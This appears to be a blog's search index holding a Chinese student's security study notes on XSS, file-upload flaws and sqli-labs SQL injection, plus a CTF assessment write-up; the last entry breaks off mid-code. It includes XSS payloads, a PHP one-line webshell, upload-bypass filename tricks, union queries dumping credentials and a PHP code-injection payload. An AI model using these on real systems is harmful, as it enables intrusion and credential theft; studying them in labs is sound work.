<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS学习笔记</title>
      <link href="posts/3459.html"/>
      <url>posts/3459.html</url>
      
        <content type="html"><![CDATA[<h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS : 跨站脚本攻击"></a>XSS : 跨站脚本攻击</h1><p><strong>将恶意的js代码进行注入<br>注入点的两个要求：<br>1.输入的东西可以在页面上显示.<br>2.一个可以自行控制的参数位置<br>GET,POST,COOKIE 如用户名输入框，留言板等</strong></p><h2 id="1-反射型XSS："><a href="#1-反射型XSS：" class="headerlink" title="1.反射型XSS："></a>1.反射型XSS：</h2><p><strong>即输即用，插入一次而没有进入服务器的存储结构中<br>?wd后为传输搜索选项的内容，可以进行插入恶意代码<br>这样的payload较长，可能带有敏感字符如&lt; script&gt;标签等，<br>容易失败，所以可以利用网上一些缩短url工具进行欺骗</strong></p><h2 id="2-存储型XSS："><a href="#2-存储型XSS：" class="headerlink" title="2.存储型XSS："></a>2.存储型XSS：</h2><p><strong>一劳永逸 向网页插入的代码会被网站添加到服务器的存储结构中<br>持久性的跨站脚本，更具威胁性<br>一般用来网站渗透、挂马、蠕虫病毒、钓鱼流量导流等<br>只要在HTML中加入&lt; script&gt;标签即可让浏览器执行我们需要的js脚本<br>  Javascript脚本语言：一种直译式脚本语言<br>广泛用于客户端   用来给HTML网页增加动态功能<br>很容易被客户端修改，可以控制浏览器做各种动作例如弹窗、重定向、刷新等</strong></p><h1 id="XSS检测："><a href="#XSS检测：" class="headerlink" title="XSS检测："></a>XSS检测：</h1><p><strong>XSS攻击通常需要获取网站用户的登录信息，如登录账号密码或者登录凭证<br>通常渗透测试中我们将测试代码浓缩为：<br>&lt; script&gt;alert(1)&lt; /script&gt;构造网页弹窗<br>这个payload中包含了几乎所有XSS利用的前提条件<br>–可以插入&lt; script&gt;标签、包含js代码的函数alert,<br>如果浏览器弹窗，说明可能存在XSS注入</strong></p><h1 id="XSS构造"><a href="#XSS构造" class="headerlink" title="XSS构造"></a>XSS构造</h1><p><strong>利用XSS漏洞，攻击者可以进行两种攻击：钓鱼和盗取Cookie<br>钓鱼步骤：<br>1.根据原始网页构造一个克隆页面<br>2.通过XSS将克隆页面导入网站后台<br>3.用户被骗后输入信息，如用户名密码<br>4.收集到信息后，我们将用户的用户名密码导入到钓鱼接受平台中<br>盗取Cookie利用原理和钓鱼相同，我们接受到用户cookie后就能够伪造身份登录后台了<br>留言板框的标签为&lt; textarea&gt;，为了屏蔽这个标签，我们使前后&lt; textarea&gt;闭合<br>如在留言板里输入&lt; /textarea&gt;&lt; script ……&gt;&lt; /script&gt;&lt; textarea&gt;</strong></p><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><p><strong>HttpOnly属性：让我们的cookie只能被http控制而不能被js控制<br>XSS绕过<br>第一种思路：不同的标签<br>主要思想为<br>           1.这个标签可以写入连接导致跳转或者包含其他页面，如&lt; img&gt;<br>            2.这个标签中可以添加事件而执行js，例如&lt; input&gt;<br>&lt; img src=”javascript:alert(‘xss’)”&gt;可以使用js的伪协议去执行xss代码，<br>当然也可以在img中导入一个外网带有xss代码链接，但是也不是所有的web浏览器都支持伪协议<br>第二种思路：产生自己的事件<br>js本来就是一种动态脚本语言<br>如果我们的输入在input标签中，后者能够自己写入一个input标签，<br>就可以构建自己的事件如onclick(点击鼠标)，onmouseover(鼠标移动)，onkeydown(敲击键盘)等响应事件<br>可以利用的事件一般分为3类：<br>1.用户接口IO（鼠标，键盘）<br>2.逻辑（处理的结果）<br>3.变化（对文档的修改）</strong></p><h2 id="编码绕过、常用编码："><a href="#编码绕过、常用编码：" class="headerlink" title="编码绕过、常用编码："></a>编码绕过、常用编码：</h2><p><strong>URL编码：通过%和ascii码编码但是要确认服务器会对我们的输入解码，否则起到反作用<br>HTML实体编码：命名实体：以&amp;开头，分号结尾的，例如“&lt;”编码为“&amp;lt”<br>字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值”，<br>                例如“&lt;”可以编码为“&lt;”和“&lt;”<br>js编码:四种编码形式，例如“e”为”\145”或”\x65”或”\u0065”<br>css编码：用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或”65”或”00065”<br>理解XSS编码顺序：在什么位置应该被谁理解</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="posts/0.html"/>
      <url>posts/0.html</url>
      
        <content type="html"><![CDATA[<hr><p>featureImages: ‘<a href="https://cdn.jsdelivr.net/gh/00yongshiwangzi/00yongshiwangzi.github.io/medias/featureimages/10.jpg'">https://cdn.jsdelivr.net/gh/00yongshiwangzi/00yongshiwangzi.github.io/medias/featureimages/10.jpg'</a><br>title= 文件上传漏洞笔记<br>abbrlink: ‘7954’</p><hr><h1 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h1><p><strong>如果服务器配置不当或者没有进行足够的过滤，而导致用户可以向服务器上传任意文件<br>包括木马，病毒，恶意脚本或者WebShell等，并被脚本解析器执行，这就产生了文件上传漏洞<br>一句话木马（小马）：<!--?php @eval($_POST['test']);?--><br>需要和中国菜刀搭配</strong></p><h2 id="中国菜刀的三个基本功能："><a href="#中国菜刀的三个基本功能：" class="headerlink" title="中国菜刀的三个基本功能："></a>中国菜刀的三个基本功能：</h2><p><strong>1.文件管理 2.数据库管理 3.虚拟终端</strong></p><h2 id="前期需要搜集什么信息？"><a href="#前期需要搜集什么信息？" class="headerlink" title="前期需要搜集什么信息？"></a>前期需要搜集什么信息？</h2><p><strong>1.目标使用的语言<br>2.中间件<br>3.服务器系统<br>4.可以上传什么类型的文件</strong></p><h1 id="解析漏洞："><a href="#解析漏洞：" class="headerlink" title="解析漏洞："></a>解析漏洞：</h1><h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><p><strong>1.目录解析：默认会把 .asp, .asa目录下的文件都解析成asp文件。<br>如：/test.asp/test.jpg<br>2.文件解析：<br>/test.asp;1.jpg<br>IIS6.0默认的可执行文件除了asp还包括 .asa、 .cer、 .cdx</strong></p><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p><strong>Apache1.x和Apache2.x中存在解析漏洞<br>在解析文件时有一个顺序，当碰到不认识的扩展名时，将会从后向前解析<br>直到碰到认识的扩展名为止，如果都不认识，则会暴露其源码<br>如：test.php.xxx</strong></p><h2 id="Nginx-lt-0-8-03空字节代码执行漏洞"><a href="#Nginx-lt-0-8-03空字节代码执行漏洞" class="headerlink" title="Nginx<0.8.03空字节代码执行漏洞"></a>Nginx&lt;0.8.03空字节代码执行漏洞</h2><p><strong>影响版本：0.5.x,0.6.x,0.7&lt;=0.7.65,0.8&lt;=0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问test.jpg%00.php来执行其中的代码</strong></p><h2 id="常见的检测方式："><a href="#常见的检测方式：" class="headerlink" title="常见的检测方式："></a>常见的检测方式：</h2><p><strong>1.客户端检测(javascript检测文件扩展名)：可以通过Bp抓包进行绕过<br>2.服务端检测(文件扩展名检测)：黑白名单<br>   黑名单：文件名大小写绕过、名单列表绕过(如asa,cer,cdx,php3等)、0x00截断<br>   白名单:解析漏洞、0x00截断<br>3.服务端检测(MIME类型、Content-Type内容)<br>所谓MIME类型检测实际上就是客户端在上传文件到服务端的时候，服务端对客户端上传文件的<br>Content-Type类型进行检测，如果是白名单所允许的，则可以正常上传，否则上传失败</strong></p><h2 id="常见的例子："><a href="#常见的例子：" class="headerlink" title="常见的例子："></a>常见的例子：</h2><p><strong>‘.gif’:’image/gif’<br>‘.doc’:’application/msword’<br>‘.asp’:’application/x-asp’<br>4.服务端检测(文件头检测)<br>插入服务器允许的文件头部进行绕过<br>如：GIF968a</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs</title>
      <link href="posts/57a7.html"/>
      <url>posts/57a7.html</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-less-1"><a href="#sqli-labs-less-1" class="headerlink" title="sqli-labs less-1"></a><strong>sqli-labs less-1</strong></h1><p><img src="https://img-blog.csdnimg.cn/20200428184940527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>1.?id=1<br><img src="https://img-blog.csdnimg.cn/20200428185128798.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185141286.png" alt="在这里插入图片描述"><br>2.?id=1’报错，发现注入点<br><img src="https://img-blog.csdnimg.cn/20200428185208528.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185216186.png" alt="在这里插入图片描述"><br>3.添加注释，使其不报错<br><img src="https://img-blog.csdnimg.cn/2020042818523544.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185241751.png" alt="在这里插入图片描述"><br>4.使用order by 进行查询长度，得出有3个字节<br><img src="https://img-blog.csdnimg.cn/20200428185249454.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185255441.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185320168.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185326483.png" alt="在这里插入图片描述"><br>5.使用union select联合查询显示位，注意：最前面的数改为-1或者很大的值<br><img src="https://img-blog.csdnimg.cn/20200428185335180.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185346923.png" alt="在这里插入图片描述"><br>6.database()查询当前数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818535675.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185401490.png" alt="在这里插入图片描述"><br>7. version()查询当前数据库版本<br><img src="https://img-blog.csdnimg.cn/20200428185608300.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185614530.png" alt="在这里插入图片描述"><br>8. (select group_concat(schema_name) from information_schema.schemata )查看所有数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818570396.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185709930.png" alt="在这里插入图片描述"><br>9. (select group_concat(table_name) from information_schema.tables where table_schema=’security’)查看security数据库中的所有表<br><img src="https://img-blog.csdnimg.cn/20200428185718490.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185722279.png" alt="在这里插入图片描述"><br>10.(select group_concat(column_name) from information_schema.columns where table_name=’users’)查看users表下的所有列<br><img src="https://img-blog.csdnimg.cn/20200428185729161.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200428185732778.png" alt="在这里插入图片描述"><br>11.(select group_concat(username) from security.users）查看username列下的数据<br>    (select group_concat(password) from security.users)     查看password列下的数据<br><img src="https://img-blog.csdnimg.cn/20200428185742437.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020042818574752.png" alt="在这里插入图片描述"></strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>战队第二次考核wp</title>
      <link href="posts/942f.html"/>
      <url>posts/942f.html</url>
      
        <content type="html"><![CDATA[<p>本帖为记录长右网络空间安全战队第二次考核题内容，希望可以记住自己做过的题，让自己更好地进步。</p><h1 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h1><p>签到题，直接提交flag即可。<br><img src="https://img-blog.csdnimg.cn/20200407093045750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="1-小熊猫变成小兔叽"><a href="#1-小熊猫变成小兔叽" class="headerlink" title="1.小熊猫变成小兔叽"></a>1.小熊猫变成小兔叽</h2><p><img src="https://img-blog.csdnimg.cn/20200407093651474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>附件为一个名为zip的文件，没有后缀，在文件名后加上.zip（压缩文件的后缀名），文件变为压缩文件。打开压缩文件，发现一张图。<br><img src="https://img-blog.csdnimg.cn/20200407094149676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目中“小熊猫拉长一下”，猜测需要改变图片的高度或者宽度。鼠标右键查看图片属性：<br><img src="https://img-blog.csdnimg.cn/20200407094437394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现图片高度比较低，于是考虑增加图片的高度。这里用到的工具为WinHex。<br>具体操作方法请参考<a href="https://blog.csdn.net/CliffordR/article/details/81123232?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158605320819725219953422%2522%252C%2522scm%2522%253A%252220140713.130056874..%2522%257D&amp;request_id=158605320819725219953422&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task-blog-blog_SOOPENSEARCH-2">CTF 图片隐写之修改图片高宽</a><br>简单来说该图片的高度为380像素，于是将380转换成十六进制，为017c,然后在WinHex找到017c，将其改为我们想要改正的数值的十六进制形式。<br>我在具体操作中将改图片的高度改为420像素（十六进制形式为01a4），成功得到图片下方的字符串：<br><img src="https://img-blog.csdnimg.cn/20200407095908462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>字符串为：olee{qlr3y_16q51_y3q1l_rc654_yap45}<br>参考题目中给出的flag形式，发现这串字符形式已经和flag的形式一样了。提示给出“低头看看键盘”，于是去搜和键盘相关的解码，发现键盘密码(键盘上的字母顺序分别对应字母表里的字母顺序，如QWE对应ABC)，OLEE正好对应了ISCC,于是使用键盘密码的方式，得到最后的flag.</p><blockquote><p>iscc{asd3f_16a51_f3a1s_dv654_fkj45}</p></blockquote><h2 id="2-Broken-WUHAN"><a href="#2-Broken-WUHAN" class="headerlink" title="2.Broken WUHAN"></a>2.Broken WUHAN</h2><p><img src="https://img-blog.csdnimg.cn/2020040710434112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载附件，为一个不可读的图片。使用WinHex打开图片，<br><img src="https://img-blog.csdnimg.cn/20200407105209321.png" alt="在这里插入图片描述"><br>发现图片的文件头标志不对(.jpg文件的头标志应该为FFD8FF)，于是修改头标志，<br><img src="https://img-blog.csdnimg.cn/20200407110509484.png" alt="在这里插入图片描述"><br>保存，成功打开图片，得到flag.<br><img src="https://img-blog.csdnimg.cn/20200407110717302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有关文件的头标志，请参考：<a href="https://blog.csdn.net/holandstone/article/details/7624343">各类文件的文件头标志</a></p><blockquote><p>flag{wu_Han_jia_Y0u!}</p></blockquote><h2 id="3-QRQRQRQRQRQRQRQRQRQRQRQRQR"><a href="#3-QRQRQRQRQRQRQRQRQRQRQRQRQR" class="headerlink" title="3. QRQRQRQRQRQRQRQRQRQRQRQRQR"></a>3. QRQRQRQRQRQRQRQRQRQRQRQRQR</h2><p><img src="https://img-blog.csdnimg.cn/20200407110930582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载附件，是一张二维码的动态图<br><img src="https://img-blog.csdnimg.cn/20200407111133130.gif" alt="在这里插入图片描述"><br>既然是动态图，那么肯定要逐一查看每一帧，找出最特殊的一帧。可以使用ps打开动态图，进行逐一查看，但是有100帧，这样有些费事。我这里使用一个软件Namo GIF编辑器，比较方便：<br><img src="https://img-blog.csdnimg.cn/20200407111915475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>于是取出第62帧，<br><img src="https://img-blog.csdnimg.cn/20200407112418932.png" alt="在这里插入图片描述"><br>第62帧与其他二维码最大的不同之处就是多了右下角的小方框。对比一般二维码，这张二维码少了三个定位符，于是用ps给这图加上定位符<br><img src="https://img-blog.csdnimg.cn/20200407112443253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用微信或者支付宝扫一扫，得到flag.(扫不出来请多扫扫，图片还原度不高会导致识别率较低)<br><img src="https://img-blog.csdnimg.cn/20200407112800922.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>flag{GYSEC_GOGOGO}</p></blockquote><h2 id="4-来玩拼图呀"><a href="#4-来玩拼图呀" class="headerlink" title="4.来玩拼图呀"></a>4.来玩拼图呀</h2><p><img src="https://img-blog.csdnimg.cn/20200407200219412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>附送的音乐为：Time,挺好听的。一开始是真的没想到这首歌的意思。附件就是二百多张拼图，而且顺序是乱的，真要拼出来花儿都谢了。其实Time的真正意思是让图片按照时间排序，就可以得到按顺序的图片了，再用ps进行拼图，就很容易了。<br><img src="https://img-blog.csdnimg.cn/20200407200821115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>flag{fate_stay_nt}</p></blockquote><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-var-dump"><a href="#1-var-dump" class="headerlink" title="1.var_dump("></a>1.var_dump(</h2><p><img src="https://img-blog.csdnimg.cn/20200407201829517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开网页，是一些代码：<br><img src="https://img-blog.csdnimg.cn/20200407201906579.png" alt="在这里插入图片描述"></p><p>虽然不是很懂，于是直接去查题目，得到：var_dump() 函数用于输出变量的相关信息。然后再去查$_REQUEST: 可以获取以POST方法和GET方法提交的数据，在参考众多网站之后，得到在网址后加上index.php?hello=1);print_r(file(“./flag.php”)，访问网址，即可得到flag.<br><img src="https://img-blog.csdnimg.cn/20200407204339657.png" alt="在这里插入图片描述"><br><a href="https://segmentfault.com/a/1190000016750234">参考文章</a></p><blockquote><p>flag{your_php_is_very_good_my_bro}</p></blockquote><h2 id="2-Easy-Challenge"><a href="#2-Easy-Challenge" class="headerlink" title="2.Easy_Challenge"></a>2.Easy_Challenge</h2><p><img src="https://img-blog.csdnimg.cn/20200407213149622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>都说了是一道老题了，那就直接上链接吧：<a href="https://blog.csdn.net/qin9800/article/details/105299457/">我是原题</a></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="1-Simple-py"><a href="#1-Simple-py" class="headerlink" title="1.Simple_py"></a>1.Simple_py</h2><p><img src="https://img-blog.csdnimg.cn/2020040809093315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是一道python逆向题，附件为一个.pyc文件，因此需要找到将.pyc文件还原为.py文件的方法。具体方法参考链接：<a href="https://blog.csdn.net/qq_37245397/article/details/103260014">python反编译exe</a><br>这篇文章介绍的是把.exe文件先变成.pyc文件再还原成.py文件的方法，在这个题中我们只需要执行.pyc还原.py就够了。</p><pre><code>// 这是还原后的.py代码：</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// import base64</span>def <span class="token function">encode</span><span class="token punctuation">(</span>mess<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> mess<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">32</span>        s <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span><span class="token function">b64encode</span><span class="token punctuation">(</span><span class="token function">bytes</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>correct <span class="token operator">=</span> b<span class="token string">'VlxRV8KreGFCYU9ZwqNPwqDCqVNPQlVPdmFRV8Kt'</span>flag <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'input flag:'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token function">encode</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">==</span> correct<span class="token punctuation">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'you are correct'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'you are wrong'</span><span class="token punctuation">)</span></code></pre><p>其中，核心代码只有中间一部分：</p><pre><code>// 核心代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//     for i in mess:</span>        x <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">32</span>        s <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p>想要得到flag,我们就要将程序反过来写，通过反向运行程序，获得原来的flag，因此，改变核心代码，得到：</p><pre><code>// 修改后的代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// import base64</span>mess<span class="token operator">=</span><span class="token string">'VlxRV8KreGFCYU9ZwqNPwqDCqVNPQlVPdmFRV8Kt'</span>s <span class="token operator">=</span> <span class="token string">''</span>mess <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>mess<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> mess<span class="token punctuation">:</span>    x <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">32</span>    x <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">16</span>    s <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></code></pre><p>运行后得到：</p><blockquote><p>flagÒ{H1R1_iÒs_ÒpÒyc_Re_F1agÒ}</p></blockquote><p>将其中明显不是密码的Ò去掉，得到最后的flag:</p><blockquote><p>flag{H1R1_is_pyc_Re_F1ag}</p></blockquote><h2 id="2-Easy-Reverse"><a href="#2-Easy-Reverse" class="headerlink" title="2.Easy Reverse"></a>2.Easy Reverse</h2><p><img src="https://img-blog.csdnimg.cn/20200408093250543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载附件，是一个.exe文件，因为不是python文件，因此我们不能用上一题一样的方法去还原其代码了。于是考虑其他的反编译器，这里使用IDA进行反编译，得到C伪代码</p><pre><code>// 伪C代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// #include &lt;stdio.h></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    int a<span class="token punctuation">;</span>    char v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+16h] [ebp-1Ah]</span>    char v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+17h] [ebp-19h]</span>    char v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-18h]</span>    char v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+19h] [ebp-17h]</span>    char v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ah] [ebp-16h]</span>    char v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Bh] [ebp-15h]</span>    char v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-14h]</span>    char v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Dh] [ebp-13h]</span>    char v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Eh] [ebp-12h]</span>    char v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Fh] [ebp-11h]</span>    char v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-10h]</span>    char v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+21h] [ebp-Fh]</span>    char v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+22h] [ebp-Eh]</span>    char v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+23h] [ebp-Dh]</span>    char v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-Ch]</span>    char v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+25h] [ebp-Bh]</span>    char v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+26h] [ebp-Ah]</span>    char v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+27h] [ebp-9h]</span>    int v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-8h]</span>    int i<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入数字:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token 